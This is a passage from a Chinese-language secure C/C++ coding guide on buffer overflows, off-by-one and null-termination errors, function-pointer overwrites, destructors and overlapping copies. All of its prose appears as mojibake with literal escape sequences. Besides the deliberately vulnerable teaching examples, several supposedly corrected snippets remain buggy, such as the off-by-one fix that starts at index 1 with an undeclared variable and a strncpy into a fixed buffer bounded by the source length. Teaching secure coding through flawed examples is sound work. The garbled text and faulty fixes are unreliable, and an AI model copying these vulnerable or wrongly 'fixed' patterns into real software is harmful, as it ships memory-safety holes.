)\n\t\t{\n\t\t\tstrncpy(dst, argv[1], strlen(argv[1]));\n\t\t\tdst[strlen(argv[1])] = â€™\\0â€™; //ã€ä¿®æ”¹ã€‘dstä»¥â€™\\0â€™ç»“å°¾\n\t\t}\n\t}\n\t/*...dstä½¿ç”¨åfree...*/ \n}\n```\né”™è¯¯ç¤ºä¾‹2ï¼šè¾“å…¥æ¶ˆæ¯é•¿åº¦ä¸å¯é¢„æµ‹ï¼Œä¸åŠ æ£€æŸ¥çš„å¤åˆ¶ä¼šé€ æˆç¼“å†²åŒºæº¢å‡ºã€‚\n```c\nvoid  Noncompliant()\n{\n\tchar dst[16];\n\tchar * temp = getInputMsg();\n\tif(temp != NULL)\n\t{\n\t\tstrcpy(dst,temp); // tempé•¿åº¦å¯èƒ½è¶…è¿‡dstçš„å¤§å°\n\t}\n\treturn; \n}\n```\næ¨èåšæ³•ï¼š \n```c\nvoid  Compliant()\n{\n\tchar dst[16];\n\tchar *temp = getInputMsg();\n\tif(temp != NULL)\n\t{\n\t\tstrncpy(dst, temp, sizeof(dst)); /* ã€ä¿®æ”¹ã€‘åªå¤åˆ¶ä¸è¶…è¿‡æ•°ç»„dstå¤§å°çš„æ•°æ® */\n\t}\n\tdst[sizeof(dst) -1] = â€™\\0â€™; //ã€ä¿®æ”¹ã€‘copyä»¥â€™\\0â€™ç»“å°¾\n\treturn;\n}\n```\n### 4.å¤åˆ¶å’Œè¿æ¥å­—ç¬¦ä¸²\nstrcpy(), strcat(), sprintf(), å®¹æ˜“æ‰§è¡Œæ— ç•Œæ“ä½œã€‚ä¾‹å¦‚ï¼š\n```c\nint main(int argc, char *argv[]){\n    /*argcå‚æ•°ä¸ªæ•°ï¼Œargvå‚æ•°æ•°ç»„*/\n}\n```\nå½“`argc>0`ï¼ŒæŒ‰ç…§æƒ¯ä¾‹ï¼Œ`argv[0]`æŒ‡å‘çš„å­—ç¬¦ä¸²æ˜¯ç¨‹åºåã€‚è‹¥`argc > 1`,åˆ™`argv[0]~argv[argc-1]`å¼•ç”¨çš„å°±æ˜¯å®é™…ç¨‹åºå‚æ•°ã€‚\nå½“åˆ†é…çš„ç©ºé—´ä¸è¶³ä»¥å¤åˆ¶ä¸€ä¸ªç¨‹åºçš„è¾“å…¥ï¼Œå°±ä¼šäº§ç”Ÿæ¼æ´ã€‚æ”»å‡»è€…å¯ä»¥æ§åˆ¶argv[0]çš„å†…å®¹.\n\nè¾“å…¥ä¸€ä¸ªå¤§äº128ä¸ªå­—èŠ‚çš„å­—ç¬¦ï¼Œæ ˆæº¢å‡ºï¼Œå³ç¼“å†²åŒºæº¢å‡ºæ¼æ´ã€‚\n```c\nint main(int argc, char *argv[])\n{\n    /*argcå‚æ•°ä¸ªæ•°ï¼Œargvå‚æ•°æ•°ç»„*/\n    char prog_name[128];\n    strcpy(prog_name, argv[0]);\n    /* ... */\n}\n```\næ ‡å‡†çš„å†™æ³•åº”è¯¥æ˜¯ï¼š\n```c\nint main(int argc, char *argv[])\n{\n    /* ä¸è¦å‡è®¾argv[0]ä¸è®¸ä¸ºç©º */\n    const char *const name = argv[0]? argv[0] : \"\";\n    char *prog_name = (char*)malloc(strlen(name)+1);\n    if(prog_name != NULL)\n     {\n        strcpy(prog_name, name);\n     }\n    else\n     {\n        /* å¤åŸ */\n     }\n}\n```\nC++é¿å…æº¢å‡ºï¼Œé€šè¿‡è®¾ç½®`åŸŸå®½`å¯ä»¥æ¶ˆé™¤gets()çš„ç¼ºé™·\n```c\n#include<iostream>\nusing namespace std;\nint mian(){\n    char buf[12];\n    cin.width(12);\n    cin >> buf;\n    cout << buf <<endl;\n}\n```\nä¾‹2:\n```c\nint main(int argc, char *argv[])\n  { char name[2048];\n\t\tstrcpy(name,argv[1]);\n\t\tstrcat(name,â€=â€);\n\t\tstrcat(name,argv[2]);\n\t\tâ€¦\n\t  }\n```\nä¸€ç§æ”¹è¿›æ–¹å¼ï¼šåˆ©ç”¨strlen()æµ‹è¯•è¾“å…¥å­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç„¶ååŠ¨æ€åœ°åˆ†é…å†…å­˜ã€‚(ç”¨å®é™…ä¸²é•¿åº¦æ¥ç”³è¯·ä¸´æ—¶ç©ºé—´ï¼‰\n```c\nint main(int argc, char *argv[])  \n  { \n    char  *name=(char *) malloc(strlen(argv[1])+ strlen(argv[2])+ 2);\n\tif(name!=0){\n        strcpy(name,argv[1]);\n\t\tstrcat(name,\"=\");\n\t\tstrcat(name,argv[2]);\n\t\tprintf(\"%s\\n\",name);\n\t\t\t /**å…¶ä»–ä»£ç **/\n\t\t\t}\n\telse{  \n            printf(\" No memory errorr!\\n\");\n\t\t}\n\treturn(0);\n}\n```\n### 5.å·®ä¸€é”™è¯¯\nä»æºå­—ç¬¦ä¸²æ‹·è´å†…å®¹åˆ°ç›®çš„å­—ç¬¦ä¸²ï¼Œåˆšå¥½æœ€åçš„'\\0'æ²¡æœ‰\n```c\nint main(void)\n{\t\n\t\tchar s[10];\n\t\tstrcpy(s,\"0123456789\");                  //é”™è¯¯1ï¼šsæ•°ç»„ä¸º10å­—èŠ‚ï¼Œå¤åˆ¶äº†11ä¸ªå­—èŠ‚\n\t\tchar *dest = (char *)malloc(strlen(s)); //é”™è¯¯2ï¼šæ²¡æœ‰è€ƒè™‘ç»“å°¾å­—ç¬¦\n\t\tfor (i = 1; i <= 11; i++)              //é”™è¯¯3ï¼šå¤šè¿­ä»£äº†ä¸€æ¬¡\n\t\t{\n\t\t\tdest[i] = s[i];                  //é”™è¯¯4ï¼šdest[i]å¯èƒ½å·²ç»è¶Šç•Œ\n            dest[i] = '\\0';\n\t\t}\t\n\t\tprintf(\"dest=%s\", dest);\n}\n```\n ä¿®æ”¹åçš„ï¼š\n ```c\nint main(void)\n{\t\n\t\tchar s[11];//ä¿®æ”¹1\n\t\tstrcpy(s,\"0123456789\");\n\t\tchar *dest = (char *)malloc(strlen(s)+1);//ä¿®æ”¹2\n\t\tfor (i = 1; i <11; i++)//ä¿®æ”¹3\n\t\t{\n\t\t\tdest[i] = s[i];\n\t\t}\t\n        dest[i] = '\\0';\n\t\tprintf(\"dest=%s\", dest);\n}\n ```\né”™è¯¯ç¤ºä¾‹ï¼šå…¸å‹çš„å·®ä¸€é”™è¯¯ï¼Œæœªè€ƒè™‘â€™\\0â€™ç»“æŸç¬¦å†™å…¥æ•°ç»„çš„ä½ç½®ï¼Œé€ æˆç¼“å†²åŒºæº¢å‡ºå’Œå†…å­˜æ”¹å†™ã€‚\n```c\nvoid NoCompliant()\n{\n\tchar dst[ARRAY_SIZE + 1];\n\tchar src[ARRAY_SIZE + 1];\n\tunsigned int i = 0;\n\tmemset(src, '@', sizeof(dst));\n\tfor(i=0; src[i] != â€™\\0â€™ && (i < sizeof(dst)); ++i )//æœªè€ƒè™‘â€™\\0â€™ç»“æŸç¬¦\n\t\tdst[i] = src[i];\n\tdst[i] = â€™\\0â€™; \n\t/*â€¦*/ \n}\n```\næ¨èåšæ³•ï¼š\n```c\nvoid Compliant()\n{\n\tchar dst[ARRAY_SIZE + 1];\n\tchar src[ARRAY_SIZE + 1];\n\tunsigned int i = 0;\n\tmemset(src, '@', sizeof(dst));\n\tfor(i=0; src[i]!=â€™\\0â€™ && (i < sizeof(dst) - 1 ); ++i) /*ã€ä¿®æ”¹ã€‘è€ƒè™‘â€™\\0â€™ç»“æŸç¬¦ */\n\t\tdst[i] = src[i];\n\tdst[i] = â€™\\0â€™; \n\t/*â€¦*/ \n}\n```\n### 6.ç©ºå­—ç¬¦ç»“å°¾é”™è¯¯\n`strncpy()`å¯¼è‡´ç»“æœå­—ç¬¦ä¸²ä¸æ˜¯ä»¥ç©ºå­—ç¬¦ç»“å°¾çš„\n```c\nint main(void)\n{\n\tchar a[16];\n\tchar b[16];\n\tchar c[16];\n\tstrncpy(a, \"0123456789abcdef\", sizeof(a));//æ­¤å¤„å·²ç»17ä¸ªå­—ç¬¦'\\0'\n\tstrncpy(b, \"0123456789abcdef\", sizeof(b));//æ­¤å¤„å·²ç»17ä¸ªå­—ç¬¦+'\\0'\n\tstrcpy(c, a);\n\tsystem(\"pause\");\n\treturn 0;\n}\n```\nä¿®æ”¹åçš„ï¼š\n```c\nint main(void)\n{\n\tchar a[17];\n\tchar b[17];\n\tchar c[17];\n\tstrncpy(a, \"0123456789abcdef\", sizeof(a));\n\ta[16] = '\\0';\t\n\tstrncpy(b, \"0123456789abcdef\", sizeof(b));\n\tb[16] = '\\0';\n\tstrcpy(c, a);\n\tsystem(\"pause\");\n\treturn 0;\n}\n```\né”™è¯¯ç¤ºä¾‹1ï¼šstrlen()ä¸ä¼šå°†â€™\\0â€™ç»“æŸç¬¦ç®—å…¥é•¿åº¦ï¼Œé…åˆmemcpyä½¿ç”¨æ—¶ä¼šä¸¢å¤±â€™\\0â€™ç»“æŸç¬¦ã€‚\n```c\nvoid  Noncompliant()\n{\n\tchar dst[11];\n\tchar src[] = \"0123456789\";\n\tchar *tmp = NULL;\n\tmemset(dst, '@', sizeof(dst)); \n\tmemcpy(dst, src, strlen(src));\n\tprintf(\"src: %s \\r\\n\", src);\n\ttmp = dst;  //åˆ°æ­¤ï¼Œdstè¿˜æ²¡æœ‰ä»¥â€™\\0â€™ç»“å°¾\n\tdo\n\t{\n\t\tputchar(*tmp);\n\t}while (*tmp++);    // è®¿é—®è¶Šç•Œ\n\treturn; \n}\n```\næ¨èåšæ³•ï¼š ä¸ºç›®æ ‡å­—ç¬¦ä¸²è®¾ç½®â€™\\0â€™ç»“æŸç¬¦\n```c\nvoid  Compliant()\n{\n\tchar dst[11];\n\tchar src[] = \"0123456789\";\n\tchar *tmp = NULL;\n\tmemset(dst, '@', sizeof(dst));\n\tmemcpy(dst, src, strlen(src));\n\tdst[sizeof(dst) - 1] = â€™\\0â€™; \t//ã€ä¿®æ”¹ã€‘dstä»¥â€™\\0â€™ç»“å°¾\n\tprintf(\"src: %s \\r\\n\", src);\n\ttmp = dst;\n\tdo\n\t{\n\t\tputchar(*tmp);\n\t} while (*tmp++);\n\treturn; \n}\n```\né”™è¯¯ç¤ºä¾‹2ï¼šstrncpy()æ‹·è´é™é•¿å­—ç¬¦ä¸²ï¼Œæˆªæ–­äº†â€™\\0â€™ç»“æŸç¬¦ã€‚ \n```c\nvoid  Noncompliant()\n{\n\tchar dst[5];\n\tchar src[] = \"0123456789\";\n\tstrncpy(dst, src, sizeof(dst)); \n     printf(dst); //è®¿é—®è¶Šç•Œï¼Œdstæ²¡æœ‰â€™\\0â€™ç»“æŸç¬¦\n\treturn;\n}\n```\næ¨èåšæ³•ï¼š \n```c\nvoid  Compliant()\n{\n\tchar dst[5]; \n\tchar src[] = \"0123456789\";\n\tstrncpy(dst, src, sizeof(dst));\n\tdst[sizeof(dst)-1] = â€™\\0â€™;  // ã€ä¿®æ”¹ã€‘æœ€åå­—èŠ‚ç½®ä¸ºâ€™\\0â€™\n     printf(dst); \n\treturn;\n}\n```\n### 7.ä½¿å­—ç¬¦ä¸²å¯¹è±¡çš„å¼•ç”¨å¤±æ•ˆ\næ ˆæº¢å‡ºçš„è¯ï¼Œå¯ä»¥æŠŠç›®æ ‡ä»£ç æˆ–è€…æ•°æ®è¦†ç›–åˆ°æ ˆé‡Œé¢ï¼Œå…³äºæ ˆä¸ºä»€ä¹ˆä¼šæº¢å‡ºï¼Œå…¶å®æ˜¯å› ä¸ºåœ¨ç¼–è¯‘åï¼Œæ ˆçš„å¤§å°å°±å›ºå®šäº†ã€‚è¿™ç§æ”»å‡»æ–¹å¼ä¹Ÿç§°æ³¨å…¥ä¸è¿‡è§£å†³æ–¹æ³•ä¹Ÿæœ‰å¾ˆå¤šï¼Œè¦ä¹ˆåšè¾¹ç•Œæ£€æŸ¥ï¼Œè¦ä¹ˆåŠ¨æ€çš„åˆ†é…å†…å­˜ï¼Œè¿˜æœ‰æ›´ç®€å•çš„é‚£å°±æ˜¯ç›´æ¥ä½¿ç”¨std::basic_stringã€‚å½“ç„¶ä½¿ç”¨stringä¹Ÿä¼šå‡ºé—®é¢˜,ä¾‹å¦‚è¿­ä»£å™¨å¤±æ•ˆã€‚\n```c\nchar input[];\nstring email;\nstring::iterator loc = email.begin();\n//å¤åˆ¶åˆ°stringå¯¹è±¡ï¼ŒåŒæ—¶æŠŠ\";\" è½¬æ¢æˆ\" \"\n    for (size_t i = 0; i < strlen(input); ++i)\n    {\n        if(input[i] != \";\")\n        email.insert(loc++, input[i]);\n    else\n        email.insert(loc++, ' ');\n}\n```\nç¬¬ä¸€æ¬¡insertä¹‹åï¼Œlocå°±å·²ç»å¤±æ•ˆï¼Œåé¢çš„insertéƒ½å°†äº§ç”Ÿæœªå®šä¹‰è¡Œä¸ºã€‚\næ­£ç¡®çš„å†™æ³•ï¼š\n```c\nchar input[];\nstring email;\nstring::iterator loc = email.begin();\n//å¤åˆ¶åˆ°stringå¯¹è±¡ï¼ŒåŒæ—¶æŠŠ\";\" è½¬æ¢æˆ\" \"\n    for (size_t i = 0; i < strlen(input); ++i)\n    {\n        if(input[i] != \";\")\n            loc = email.insert(loc, input[i]);\n        else\n            loc = email.insert(loc, ' ');\n            ++loc;\n    }\n```\n### 8.è¿›ç¨‹å†…å­˜ç»„ç»‡\n![](https://i1.100024.xyz/i/2019/10/31/12bq026.png)\n### 9.ä»£ç æ³¨å…¥\næ¶æ„ä»£ç æŠŠæ ˆä¸­çš„è¿”å›ä»£ç ä¿®æ”¹æˆè°ƒç”¨å…¶å®ƒå‡½æ•°,ç”šè‡³æ˜¯ç³»ç»Ÿä¸­æŸäº›å‘½ä»¤çš„ä»£ç ,å¯¼è‡´åœ¨è¯¥ç¨‹åºé€€å‡ºä¹‹å‰æŠŠæœ¬èº«å…·æœ‰çš„æƒé™äº¤ç»™äº†è¿™äº›å‘½ä»¤,ä»è€Œå¼•å‘æœ€ä¸¥é‡çš„å®‰å…¨é—®é¢˜.\nä»»ä½•æ¼æ´åˆ©ç”¨çš„ä¸»è¦éƒ¨åˆ†éƒ½æ˜¯æ¶æ„å‚æ•°\n```\næ¶æ„å‚æ•°çš„ç‰¹å¾:\n1.æœ‰æ¼æ´çš„ç¨‹åºå¿…é¡»æ¥å—è¿™äº›å‚æ•°ä½œä¸ºåˆæ³•è¾“å…¥.\n2.å‚æ•°,æˆ–å…¶ä»–å¯æ§åˆ¶çš„è¾“å…¥,å¿…é¡»å¯¼è‡´æœ‰æ¼æ´çš„ä»£ç è·¯å¾„å¾—åˆ°æ‰§è¡Œ.\n3.å‚æ•°ä¸èƒ½åœ¨ç¨‹åºå°†æ§åˆ¶æƒè½¬ç§»åˆ°ShellCodeï¼ˆæ¶æ„ä»£ç ï¼‰ä¹‹å‰å¯¼è‡´ç¨‹åºå¼‚å¸¸ä¸­æ­¢.\n```\n### 10.å¼§æ³¨å…¥\né€šè¿‡ä¿®æ”¹æ ˆä¸­çš„åœ°å€,æ”¹å˜ç¨‹åºæ‰§è¡Œçš„æµç¨‹,è¾¾åˆ°ç»•è¿‡æŸäº›ä»£ç (ç‰¹åˆ«æ˜¯å®‰å…¨æ£€æŸ¥çš„ä»£ç )çš„æŠ€æœ¯ã€‚\n### 11.å­—ç¬¦ä¸²æ¼æ´ç¼“è§£ç­–ç•¥\nåŸºæœ¬æ–¹å¼æ˜¯:\n1.é¢„é˜²ç¼“å†²åŒºæº¢å‡º.\n2.ä¾¦æµ‹ç¼“å†²åŒºæº¢å‡º,å¹¶å®‰å…¨æ¢å¤.\n3.é™æ€é¢„é˜²:è®¾å®šç¼“å†²åŒº,ä¸å…è®¸è¶…è¿‡.\n4.åŠ¨æ€é¢„é˜²:åœ¨å¾—åˆ°å®å‚æ—¶,æ£€æµ‹å‚æ•°çš„é•¿åº¦,å¦‚æœè¶…å‡ºå¯å¤„ç†èŒƒå›´,åˆ™å®‰å…¨é€€å‡º.\n5.ç”¨æ–°çš„æ ‡å‡†å‡½æ•°æ›¿ä»£æ—§çš„æœ‰å®‰å…¨éšæ‚£çš„å‡½æ•°.ä¾‹å¦‚ç”¨`strcpy_s()å’Œstrcat_s()`å–ä»£` strcpy()å’Œstrcat()`æˆ–ç”¨`strncpy()å’Œstrncat()`;ç”¨`fgets(buf,bufLen,stdin)å’Œgets_s(buf,bufLen)`     ä»£æ›¿`gets(buf)`.\n### 12.ç¦ç”¨ä¸å®‰å…¨å‡½æ•°æˆ–å¯¹è±¡\nè¯´æ˜ï¼šCæ ‡å‡†çš„ç³»åˆ—å­—ç¬¦ä¸²å¤„ç†å‡½æ•°ï¼Œä¸æ£€æŸ¥ç›®æ ‡ç¼“å†²åŒºçš„å¤§å°ï¼Œå®¹æ˜“å¼•å…¥ç¼“å†²åŒºæº¢å‡ºçš„å®‰å…¨æ¼æ´ã€‚\n```\nï¬\tå­—ç¬¦ä¸²æ‹·è´å‡½æ•°ï¼šstrcpy, wcscpy\nï¬\tå­—ç¬¦ä¸²æ‹¼æ¥å‡½æ•°ï¼šstrcat, wcscat\nï¬\tå­—ç¬¦ä¸²æ ¼å¼åŒ–è¾“å‡ºå‡½æ•°ï¼šsprintf, swprintf, vsprintf, vswprintf, \nï¬\tå­—ç¬¦ä¸²æ ¼å¼åŒ–è¾“å…¥å‡½æ•°ï¼šscanf, wscanf, sscanf, swscanf, fscanf, vfscanf, vscanf, vsscanf\nï¬\tstdinæµè¾“å…¥å‡½æ•°ï¼šgets\n```\nè¿™ç±»å‡½æ•°æ˜¯å…¬è®¤çš„å±é™©å‡½æ•°ï¼Œåº”ç¦æ­¢ä½¿ç”¨æ­¤ç±»å‡½æ•°ï¼ˆå¾®è½¯ä»Windows Vistaçš„å¼€å‘å¼€å§‹å°±å…¨é¢ç¦ç”¨äº†å±é™©APIï¼‰ã€‚\n**æœ€ä¼˜é€‰æ‹©ï¼š**ä½¿ç”¨ISO/IEC TR 24731-1å®šä¹‰çš„å­—ç¬¦ä¸²æ“ä½œå‡½æ•°çš„å®‰å…¨ç‰ˆæœ¬ï¼Œå¦‚`strcpy_sã€strcat_s()ã€sprintf_s()ã€scanf_s()ã€gets_s()`\nè¿™ä¸ªç‰ˆæœ¬çš„å‡½æ•°å¢åŠ äº†ä»¥ä¸‹å®‰å…¨æ£€æŸ¥ï¼š\n```\nï¬\tæ£€æŸ¥æºæŒ‡é’ˆå’Œç›®æ ‡æŒ‡é’ˆæ˜¯å¦ä¸ºNULLï¼›\nï¬\tæ£€æŸ¥ç›®æ ‡ç¼“å†²åŒºçš„æœ€å¤§é•¿åº¦æ˜¯å¦å°äºæºå­—ç¬¦ä¸²çš„é•¿åº¦ï¼›\nï¬\tæ£€æŸ¥å¤åˆ¶çš„æºå’Œç›®çš„å¯¹è±¡æ˜¯å¦é‡å ã€‚\n```\nç¼ºç‚¹æ˜¯:ç¼–è¯‘å™¨å¯¹TR 24731çš„æ”¯æŒè¿˜ä¸æ™®éã€‚\n**æ¬¡ä¼˜é€‰æ‹©ï¼š**å¯ä»¥ä½¿ç”¨å¸¦nçš„æ›¿ä»£å‡½æ•°ï¼Œå¦‚`strncpy/strncat/snprintf`\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¸¦nç‰ˆæœ¬çš„å‡½æ•°ä¼šæˆªæ–­è¶…å‡ºé•¿åº¦é™åˆ¶çš„å­—ç¬¦ä¸²ï¼ŒåŒ…æ‹¬æºå­—ç¬¦ä¸²ç»“å°¾çš„â€™\\0â€™ã€‚è¿™å°±å¾ˆå¯èƒ½å¯¼è‡´ç›®æ ‡å­—ç¬¦ä¸²ä»¥éâ€™\\0â€™ç»“æŸã€‚å­—ç¬¦ä¸²ç¼ºå°‘â€™\\0â€™ç»“æŸç¬¦ï¼ŒåŒæ ·å¯¼è‡´ç¼“å†²åŒºæº¢å‡ºå’Œå…¶å®ƒæœªå®šä¹‰è¡Œä¸ºã€‚éœ€è¦ç¨‹åºå‘˜ä¿è¯ç›®æ ‡å­—ç¬¦ä¸²ä»¥â€™\\0â€™ç»“æŸï¼Œæ‰€ä»¥å¸¦nç‰ˆæœ¬çš„å‡½æ•°ä¹Ÿè¿˜æ˜¯å­˜åœ¨ä¸€å®šé£é™©ã€‚\n\nå»¶ä¼¸é˜…è¯»ææ–™ï¼šå¾®è½¯ç¦ç”¨äº†æ›´å¤šçš„å±é™©APIï¼Œå‚è€ƒä»¥ä¸‹é“¾æ¥ï¼š\nhttp://msdn.microsoft.com/en-us/library/bb288454.aspx\n\n## æŒ‡é’ˆ\n### 1.å‡½æ•°æŒ‡é’ˆ\n```c\n#include <malloc.h>\n#include <stdio.h>\n#include <string.h>\n#include <conio.h>\n\nvoid good_function(const char *str)\n{\n    printf(\"  This is good_function str=%s\",str); return;\n}\nvoid main(int argc ,char *argv[])\n{\n    #define BufLen 80\n\tstatic char Buf[BufLen];\n\tstatic void (*FunPtr) (const char *str);\n\tFunPtr=&good_function;\n\tstrncpy(Buf,argv[1],strlen(argv[1]));\n\tprintf(\"\\n argc=%d \",argc);\n    printf(\"\\n argv[1]=%s\",argv[1]);\n    printf(\"\\n argv[2]=%s\",argv[2]);\n    printf(\"\\n argv[3]=%s\",argv[3]);\n    getch();\n\t(void)(*FunPtr) (argv[2]);\n}\n```\nå¦‚æœæœ‰äººæ¶æ„è¾“å…¥`argv[1]`è¶…è¿‡`BufLen`é•¿åº¦,åˆ™ä¼šä¿®æ”¹`good_function()`çš„åœ°å€.é€€å‡ºæ—¶çš„`shellcode`ä¼šå–ä»£è¯¥å‡½æ•°.\n### 2.å¯¹è±¡æŒ‡é’ˆ\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <conio.h>\nvoid foo(void *arg,int len)\n{\n  #define BufLen 40\n  int i;\n  char Buf[BufLen];\n  long *ptr;\n  char S[BufLen];\n  ptr=(long *)S;\n  for(i=0;i<BufLen;i++)\n      Buf[i]=i;\n  printf(\"\\nAddress ptr=%x Buf=%x S=%x\\n S[]=\",Buf,ptr,S);\n  for(i=0;i<BufLen*2+4;i++)\n      printf(\"%x,\",S[i]);\n  getch();\n  // memcpy(Buf,arg,len);   \n  /*ä»»æ„å†™è¦†ç›–å†…å­˜.!!!ç°åœ¨çš„OSå·²ç»åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå°æ€äº†è¿™ç§æ¼æ´.æ³¨æ„è¿è¡Œæ—¶ç¨‹åºå‡ºé”™*/\n  /* å…¶ä»–ç¨‹åº*/\n}\n\nint main()\n{\n  char S[BufLen*2];\n  int i;\n  for(i=0;i<BufLen*2;i++)\n  S[i]=i;\n  foo(S,(BufLen*2));\n  exit(0);\n}\n\n```\n### 3.ç¦æ­¢å®šä¹‰åŸºç±»ææ„å‡½æ•°ä¸ºéè™šå‡½æ•°ï¼Œæ‰€æœ‰å¯èƒ½è¢«ç»§æ‰¿ç±»çš„ææ„å‡½æ•°éƒ½å¿…é¡»å®šä¹‰ä¸ºvirtual\nè¯´æ˜ï¼šåŸºç±»çš„ææ„å‡½æ•°å¦‚æœä¸æ˜¯virtualçš„ï¼Œé‚£ä¹ˆåœ¨å¯¹ä¸€ä¸ªBaseç±»å‹çš„æŒ‡é’ˆè¿›è¡Œdeleteæ—¶ï¼Œå°±ä¸ä¼šè°ƒç”¨åˆ°æ´¾ç”Ÿç±»Derivedçš„ææ„å‡½æ•°ã€‚è€Œæ´¾ç”Ÿç±»é‡Œçš„ææ„å‡½æ•°ä¸€èˆ¬ä¼šç”¨äºææ„å…¶å†…éƒ¨çš„å­å¯¹è±¡ï¼Œè¿™æ ·å°±å¯èƒ½ä¼šé€ æˆå†…å­˜æ³„æ¼ã€‚\n\né”™è¯¯ç¤ºä¾‹ï¼šä»£ç ä¸­çš„ææ„å‡½æ•°æ²¡æœ‰è¢«å®šä¹‰æˆè™šå‡½æ•°ã€‚\n```c\nclass Base \n{\npublic:\n\t~Base(){}; //ã€é”™è¯¯ã€‘ç¦æ­¢å®šä¹‰åŸºç±»ææ„å‡½æ•°ä¸ºéè™šå‡½æ•°\n};\nclass Derived : public Base \n{\nprivate:\n\tchar *pc;\npublic:\n\tDerived()\n\t{\n\t\tpc=new char[100]; \n\t};\n\t~ Derived()\n\t{\n\t\tdelete [] pc;\n\t};\n};\nvoid main()\n{\n\tBase *obj = new Derived();\n\tdelete obj;\n}\n```\nä»¥ä¸Šç¤ºä¾‹ä»£ç åŸºç±»Baseçš„ææ„å‡½æ•°ä¸æ˜¯virtualçš„ã€‚å› ä¸ºä¸æ˜¯virtualï¼Œæ‰€ä»¥åœ¨å¯¹Baseç±»å‹çš„æŒ‡é’ˆobjè¿›è¡Œdeleteæ—¶ï¼Œä¸ä¼šè°ƒç”¨åˆ°æ´¾ç”Ÿç±»Derivedçš„ææ„å‡½æ•°,è¿™æ ·å°±é€ æˆå†…å­˜æ³„æ¼ã€‚ \næ¨èåšæ³•ï¼šåŸºç±»Baseçš„ææ„å‡½æ•°å®šä¹‰ä¸ºvirtualï¼Œè¿™æ ·ç¡®ä¿åœ¨å¯¹Baseç±»å‹çš„æŒ‡é’ˆobjè¿›è¡Œdeleteæ—¶è°ƒç”¨æ´¾ç”Ÿç±»Derivedçš„ææ„å‡½æ•°ã€‚\n```c\nclass Base {\npublic:\n\tvirtual ~Base(){};//ã€ä¿®æ”¹ã€‘å®šä¹‰åŸºç±»ææ„å‡½æ•°ä¸ºè™šå‡½æ•°\n};\nclass Derived : public Base {\nprivate:\n\tchar *pc;\npublic:\n\tDerived()\n\t{\n\t\tpc=new char[100]; \n\t};\n\t~ Derived()\n\t{\n\t\tdelete [] pc;\n\t};\n};\nvoid main()\n{\n\tBase *obj = new Derived();\n\tdelete obj;\n}\n```\n### 4.é¿å…å­—ç¬¦ä¸²/å†…å­˜æ“ä½œå‡½æ•°çš„æºæŒ‡é’ˆå’Œç›®æ ‡æŒ‡é’ˆæŒ‡å‘å†…å­˜é‡å åŒº\nè¯´æ˜ï¼šå†…å­˜é‡å åŒºæ˜¯æŒ‡ä¸€æ®µç¡®å®šå¤§å°åŠåœ°å€çš„å†…å­˜åŒºï¼Œè¯¥å†…å­˜åŒºè¢«å¤šä¸ªåœ°å€æŒ‡é’ˆæŒ‡å‘æˆ–å¼•ç”¨ï¼Œè¿™äº›æŒ‡é’ˆä»‹äºé¦–åœ°å€å’Œå°¾åœ°å€ä¹‹é—´ã€‚\nåœ¨ä½¿ç”¨åƒmemcpyã€strcpyã€strncpyã€sscanf()ã€sprintf()ã€snprintf()å’Œwcstombs()è¿™æ ·çš„å‡½æ•°æ—¶ï¼Œå¤åˆ¶é‡å å¯¹è±¡ä¼šå­˜åœ¨æœªå®šä¹‰çš„è¡Œä¸ºï¼Œè¿™ç§è¡Œä¸ºå¯èƒ½ç ´åæ•°æ®çš„å®Œæ•´æ€§ã€‚\né”™è¯¯ç¤ºä¾‹1ï¼šsnprintfçš„å‚æ•°ä½¿ç”¨å­˜åœ¨é—®é¢˜\n```c\nvoid  Noncompliant()\n{\n#define MAX_LEN 1024\n\tchar cBuf[MAX_LEN + 1] = {0};\n\tint nPid = 0;\n\tstrncpy(cBuf, â€Hello World!â€, strlen(â€Hello World!â€));\n\tsnprintf(cBuf, MAX_LEN, \"%d: %s\", nPid, cBuf); /* cBufæ—¢æ˜¯æºåˆæ˜¯ç›®æ ‡ï¼Œå‡½æ•°ä½¿ç”¨ä¸å®‰å…¨ */\n\treturn; \n}\n```\næ¨èåšæ³•ï¼šä½¿ç”¨ä¸åŒæºå’Œç›®æ ‡ç¼“å†²åŒºæ¥å®ç°å¤åˆ¶åŠŸèƒ½ã€‚\n```c\nvoid  Compliant()\n{\n#define MAX_LEN 1024\n\tchar cBuf[MAX_LEN + 1] = {0};\n\tchar cDesc[MAX_LEN + 1] = {0}; //ã€ä¿®æ”¹ã€‘å¦èµ·ä¸€ä¸ªç¼“å†²åŒºï¼Œé˜²æ­¢ç¼“å†²åŒºé‡å å‡ºé”™\n\tint nPid = 0;\n\tstrncpy(cDesc, â€Hello World!â€, strlen(â€Hello World!â€)); /* ã€ä¿®æ”¹ã€‘é˜²æ­¢ç¼“å†²åŒºé‡å å‡ºé”™ */\n\tsnprintf(cBuf, MAX_LEN, \"%d: %s\", nPid, cDesc); /* ã€ä¿®æ”¹ã€‘é˜²æ­¢ç¼“å†²åŒºé‡å å‡ºé”™ */\n\treturn;\n}\n```\né”™è¯¯ç¤ºä¾‹2ï¼š\n```c\n#define MSG_OFFSET 3\n#define MSG_SIZE 6\nvoid  NoCompliant ()\n{\n\tchar str[] = \"test string\";\n\tchar *ptr1 = str;\n\tchar *ptr2;\n\tptr2 = ptr1+MSG_OFFSET;\n\tmemcpy(ptr2, ptr1, MSG_SIZE);\n\treturn;\n}\n```\næ¨èåšæ³•ï¼šä½¿ç”¨memmoveå‡½æ•°ï¼Œæºå­—ç¬¦ä¸²å’Œç›®æ ‡å­—ç¬¦ä¸²æ‰€æŒ‡å†…å­˜åŒºåŸŸå¯ä»¥é‡å ï¼Œä½†å¤åˆ¶åç›®æ ‡å­—ç¬¦ä¸²å†…å®¹ä¼šè¢«æ›´æ”¹ï¼Œè¯¥å‡½æ•°å°†è¿”å›æŒ‡å‘ç›®æ ‡å­—ç¬¦ä¸²çš„æŒ‡é’ˆã€‚\n```c\n#define MSG_OFFSET 3\n#define MSG_SIZE 6\nvoid  Compliant ()\n{\n\tchar str[] = \"test string\";\n\tchar *ptr1 = str;\n\tchar *ptr2;\n\tptr2 = ptr1 + MSG_OFFSET;\n\tmemmove(ptr2, ptr1, MSG_SIZE); /*ã€ä¿®æ”¹ã€‘ä½¿ç”¨memmoveä»£æ›¿memcpyï¼Œé˜²æ­¢ç¼“å†²åŒºé‡å å‡ºé”™ 